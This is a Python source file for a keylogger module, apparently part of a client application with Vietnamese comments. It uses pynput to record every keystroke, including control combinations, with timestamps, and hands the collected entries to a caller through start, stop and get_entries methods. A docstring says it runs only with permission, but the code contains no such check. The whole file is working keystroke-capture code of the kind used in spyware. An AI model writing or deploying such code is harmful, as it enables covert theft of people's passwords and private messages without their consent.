# client-app/modules/keylogger.py
from pynput import keyboard
import logging
import time

logger = logging.getLogger("Module-Keylogger")

class KeyloggerManager:
    """Module theo dõi phím gõ người dùng (Chỉ chạy khi được phân quyền)."""
    
    def __init__(self):
        self.entries = []       # list of {key, timestamp}
        self.listener = None
        self.is_running = False
        self._window_title = "Unknown"

    def _on_press(self, key):
        """Hàm callback nội bộ bắt sự kiện khi một phím được nhấn."""
        try:
            try:
                key_str = key.char
                # Control character (Ctrl+A → \x01, Ctrl+C → \x03, ...)
                if key_str and len(key_str) == 1 and 0 < ord(key_str) < 32:
                    ctrl_char = chr(ord(key_str) + 96)  # \x01 → 'a', \x03 → 'c'
                    key_str = f"[CTRL+{ctrl_char.upper()}]"
            except AttributeError:
                # Bỏ qua các phím modifier đơn thuần: Ctrl, Shift, Alt, Win
                if key in (keyboard.Key.ctrl, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
                           keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r,
                           keyboard.Key.alt, keyboard.Key.alt_l, keyboard.Key.alt_r,
                           keyboard.Key.alt_gr, keyboard.Key.cmd):
                    return
                if key == keyboard.Key.space:
                    key_str = " "
                elif key == keyboard.Key.enter:
                    key_str = "\n"
                elif key == keyboard.Key.backspace:
                    key_str = "[BACKSPACE]"
                else:
                    key_str = f"[{key.name.upper()}]"
            
            self.entries.append({"key": key_str, "timestamp": int(time.time())})
        except Exception as e:
            logger.error(f"Lỗi trong _on_press: {e}")

    def start(self) -> dict:
        """Bắt đầu ghi nhận phím gõ."""
        if not self.is_running:
            self.listener = keyboard.Listener(on_press=self._on_press)
            self.listener.start()
            self.is_running = True
            logger.info("Keylogger đã khởi động.")
            return {"success": True, "message": "Đã BẬT bộ ghi phím."}
        return {"success": True, "message": "Bộ ghi phím đang chạy sẵn."}

    def stop(self) -> dict:
        """Dừng ghi nhận phím."""
        if self.is_running and self.listener:
            self.listener.stop()
            self.is_running = False
            logger.info("Keylogger đã dừng.")
            return {"success": True, "message": "Đã TẮT bộ ghi phím."}
        return {"success": True, "message": "Bộ ghi phím đã tắt từ trước."}

    def get_entries(self, clear_after_read: bool = True) -> dict:
        """Lấy entries array theo format docs: {entries: [{key, timestamp}], windowTitle}."""
        current = list(self.entries)
        if clear_after_read:
            self.entries = []
        return {
            "success": True,
            "entries": current,
            "windowTitle": self._window_title
        }

# Khởi tạo instance
keylogger_manager = KeyloggerManager()